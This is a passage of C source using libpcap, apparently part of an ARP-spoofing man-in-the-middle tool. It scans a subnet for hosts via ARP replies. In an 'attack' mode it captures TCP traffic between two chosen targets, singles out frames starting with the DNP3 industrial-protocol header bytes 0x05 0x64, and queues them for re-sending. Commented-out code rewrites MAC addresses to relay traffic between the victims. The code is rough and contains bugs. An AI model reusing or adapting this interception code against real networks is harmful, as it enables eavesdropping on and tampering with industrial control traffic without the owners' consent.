			if (pcap_compile(scanForHosts->adhandle, &fp, filter_exp, 0, scanForHosts->netmask) == -1) {
				fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(scanForHosts->adhandle));
				return(2);
			}

			if (pcap_setfilter(scanForHosts->adhandle, &fp) == -1) {
				fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(scanForHosts->adhandle));
				return(2);
			}
		}
		else {
			//char filter_exp[] = "tcp";	/* The filter expression */

			//if (pcap_compile(scanForHosts->adhandle, &fp, filter_exp, 0, scanForHosts->netmask) == -1) {
			//	fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(scanForHosts->adhandle));
			//	return(2);
			//}

			//if (pcap_setfilter(scanForHosts->adhandle, &fp) == -1) {
			//	fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(scanForHosts->adhandle));
			//	return(2);
			//}
		}
		struct pcap_pkthdr *header;
		const u_char *pkt_data;
		int res;

		while ((res = pcap_next_ex(scanForHosts->adhandle, &header, &pkt_data)) >= 0) {

			if (res == 0)
				/* Timeout elapsed */
				continue;

			if (res == -1) {
				printf("Error reading the packets: %s\n", pcap_geterr(scanForHosts->adhandle));
			}
			else {
				HandleARPRepliesNew(scanForHosts->isAttack, pkt_data);
			}
		}

		/*if (*scanForHosts->isAttack == 1) {
			while (!terminate) {
				printf("Start loop\n");
				int result = pcap_loop(scanForHosts->adhandle, -1, HandleARPReplies, scanForHosts->isAttack);
				printf("Result in spoof loop: %d\n", result);
			}
		}
		else {
			pcap_loop(scanForHosts->adhandle, -1, HandleARPReplies, scanForHosts->isAttack);
		}*/
	}

	void* HandleARPReplies(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {

		const struct ethernet_header *ethernet;
		const struct arp_header *arp;

		unsigned short opcode;
		unsigned short arp_reply = 2;

		if (*args != 1) {
			ethernet = (struct ethernet_header*)(packet);
			arp = (struct arp_header*)(packet + ETH2_HEADER_LEN);

			opcode = ntohs(arp->opcode);
			if (opcode == arp_reply) {

				host_l->ips[host_l->host_count] = arp->sender_ip[3];
				printf("%u\n", arp->sender_ip[3]);

				for (int index = 0; index < 6; index++) {
					host_l->macs[host_l->host_count * 6 + index] = arp->sender_mac[index];
				}

				host_l->host_count++;
			}
		}
		else {
			printf("Handle loop\n");
			ethernet = (struct ethernet_header*)(packet);

			if (!AreMACAdressesEqual(ethernet->ether_shost, myMAC)) {

				bool send = true;

				Packet* packetStruct = (Packet *)malloc(sizeof(Packet));

				short reverse = ReverseEndian(&ethernet->ether_type, 2);
				if (ReverseEndian(&ethernet->ether_type, 2) == ETH_P_IP)
				{
					int ethernet_header_len = sizeof(ethernet_header);
					struct ip_header *ip = (struct ip_header*)(packet + ethernet_header_len);

					for (int i = 0; i < 4; i++) {
						packetStruct->source_addr[i] = ip->source_addr[i];
					}

					char ip_header_len = ip->version_len << 4;
					ip_header_len = (ip_header_len >> 4) * 4;

					if (AreAdressesEqual(ip->dest_addr, target1) || AreAdressesEqual(ip->source_addr, target1)
						|| AreAdressesEqual(ip->dest_addr, target2) || AreAdressesEqual(ip->source_addr, target2))
					{
						if (ip->protocol == TCP_PROTOCOL_NUM)
						{
							struct tcp_header *tcp = (struct tcp_header*)(packet + ethernet_header_len + ip_header_len);

							unsigned short temp = (tcp->len_flags << 8);
							unsigned char tcp_header_len = (temp >> 12) * 4;

							unsigned short ip_total_len = ReverseEndian(&ip->length, 2);

							if (ip_total_len > (ip_header_len + tcp_header_len))
							{
								char* data = packet + ethernet_header_len + ip_header_len + tcp_header_len;

								if (data[0] == 0x05 && data[1] == 0x64) {
									send = false;

									char len = data[2];

									for (int i = 0; i < 4; i++) {
										packetStruct->source_addr[i] = ip->source_addr[i];
									}

									packetStruct->dataOffset = ethernet_header_len + ip_header_len + tcp_header_len;

									char actualLen = (char)(2 + 1 + 5 + 2); // start + len + ctrl + dest + source + crc

									len -= 5; // minus header

									while (len > 0)
									{
										if (len < 16)
										{
											// last chunk
											actualLen += (char)(len + 2);
											break;
										}

										actualLen += (char)(16 + 2);
										len -= 16;
									}

									packetStruct->dataLength = actualLen;

									actualLen += actualLen + 14 + 20 + 20;

									for (int i = 0; i < actualLen; i++)
									{
										packetStruct->packet[i] = packet[i];
									}

									Insert(*packetStruct);
									//free(packetStruct);
								}
							}
						}
					}

					/*if (send && (AreMACAdressesEqual(ethernet->ether_shost, target1MAC) || AreMACAdressesEqual(ethernet->ether_shost, target2MAC))) {

						int ip_len = ntohs(ip->length);

						for (int i = 0; i < ethernet_header_len + ip_len; i++) {
							packetStruct->packet[i] = packet[i];
						}

						packetStruct->size = ethernet_header_len + ip_len;

						if (AreMACAdressesEqual(ethernet->ether_shost, target1MAC)) {
							memcpy((unsigned char *)packet, &target2MAC, 6);
						}
						else if (AreMACAdressesEqual(ethernet->ether_shost, target2MAC)) {
							memcpy((unsigned char *)packet, &target1MAC, 6);
						}

						EnterCriticalSection(&packetCritSec);
						InsertPacket(*packetStruct);
						LeaveCriticalSection(&packetCritSec);
					}*/
				}

				free(packetStruct);
			}
		}
	}

	void HandleARPRepliesNew(u_char *args, const u_char *packet) {

		const struct ethernet_header *ethernet;
		const struct arp_header *arp;

		unsigned short opcode;
		unsigned short arp_reply = 2;

		if (*args != 1) {
			ethernet = (struct ethernet_header*)(packet);
			arp = (struct arp_header*)(packet + ETH2_HEADER_LEN);

			opcode = ntohs(arp->opcode);
			if (opcode == arp_reply) {

				host_l->ips[host_l->host_count] = arp->sender_ip[3];
				printf("%u\n", arp->sender_ip[3]);

				for (int index = 0; index < 6; index++) {
					host_l->macs[host_l->host_count * 6 + index] = arp->sender_mac[index];
				}

				host_l->host_count++;
			}
		}
		else {
			printf("Handle loop\n");
			ethernet = (struct ethernet_header*)(packet);

			if (!AreMACAdressesEqual(ethernet->ether_shost, myMAC)) {

				bool send = true;

				Packet* packetStruct = (Packet *)malloc(sizeof(Packet));

				short reverse = ReverseEndian(&ethernet->ether_type, 2);
				if (ReverseEndian(&ethernet->ether_type, 2) == ETH_P_IP)
				{
					int ethernet_header_len = sizeof(ethernet_header);
					struct ip_header *ip = (struct ip_header*)(packet + ethernet_header_len);

					for (int i = 0; i < 4; i++) {
						packetStruct->source_addr[i] = ip->source_addr[i];
					}

					char ip_header_len = ip->version_len << 4;
					ip_header_len = (ip_header_len >> 4) * 4;

					if (AreAdressesEqual(ip->dest_addr, target1) || AreAdressesEqual(ip->source_addr, target1)
						|| AreAdressesEqual(ip->dest_addr, target2) || AreAdressesEqual(ip->source_addr, target2))
					{
						if (ip->protocol == TCP_PROTOCOL_NUM)
						{
							struct tcp_header *tcp = (struct tcp_header*)(packet + ethernet_header_len + ip_header_len);

							unsigned short temp = (tcp->len_flags << 8);
							unsigned char tcp_header_len = (temp >> 12) * 4;

							unsigned short ip_total_len = ReverseEndian(&ip->length, 2);

							if (ip_total_len > (ip_header_len + tcp_header_len))
							{
								char* data = packet + ethernet_header_len + ip_header_len + tcp_header_len;

								if (data[0] == 0x05 && data[1] == 0x64) {
									send = false;

									char len = data[2];

									for (int i = 0; i < 4; i++) {
										packetStruct->source_addr[i] = ip->source_addr[i];
									}

									packetStruct->dataOffset = ethernet_header_len + ip_header_len + tcp_header_len;

									char actualLen = (char)(2 + 1 + 5 + 2); // start + len + ctrl + dest + source + crc

									len -= 5; // minus header

									while (len > 0)
									{
										if (len < 16)
										{
											// last chunk
											actualLen += (char)(len + 2);
											break;
										}

										actualLen += (char)(16 + 2);
										len -= 16;
									}

									packetStruct->dataLength = actualLen;

									actualLen += actualLen + 14 + 20 + 20;

									for (int i = 0; i < actualLen; i++)
									{
										packetStruct->packet[i] = packet[i];
									}

									Insert(*packetStruct);
									//free(packetStruct);
								}
							}
						}
					}

					/*if (send && (AreMACAdressesEqual(ethernet->ether_shost, target1MAC) || AreMACAdressesEqual(ethernet->ether_shost, target2MAC))) {

					int ip_len = ntohs(ip->length);

					for (int i = 0; i < ethernet_header_len + ip_len; i++) {
					packetStruct->packet[i] = packet[i];
					}

					packetStruct->size = ethernet_header_len + ip_len;

					if (AreMACAdressesEqual(ethernet->ether_shost, target1MAC)) {
					memcpy((unsigned char *)packet, &target2MAC, 6);
					}
					else if (AreMACAdressesEqual(ethernet->ether_shost, target2MAC)) {
					memcpy((unsigned char *)packet, &target1MAC, 6);
					}

					EnterCriticalSection(&packetCritSec);
					InsertPacket(*packetStruct);
					LeaveCriticalSection(&packetCritSec);
					}*/
				}

				free(packetStruct);
			}
		}
	}

	DWORD WINAPI SendPackets(LPVOID lpParam)
	{
		pcap_t *adhandle = (pcap_t*)lpParam;
		unsigned char buffer[MAX_PACKET_SIZE];

		while (!terminate) {
			if (packetCount != 0) {

				EnterCriticalSection(&packetCritSec);
				Packet packet = RemovePacket();

				if (!packet.source_addr[0] == 0) {

					for (int i = 0; i < packet.size; i++) {
						buffer[i] = packet.packet[i];
					}

					if (!(packet.size <= 0)) {
						if (pcap_sendpacket(adhandle, buffer, packet.size /* size */) != 0)
						{
							fprintf(stderr, "\nError sending the packet: \n", pcap_geterr(adhandle));
							return 0;
						}
					}
				}
				LeaveCriticalSection(&packetCritSec);
			}
		}
	}

#ifdef __cplusplus
}
#endif


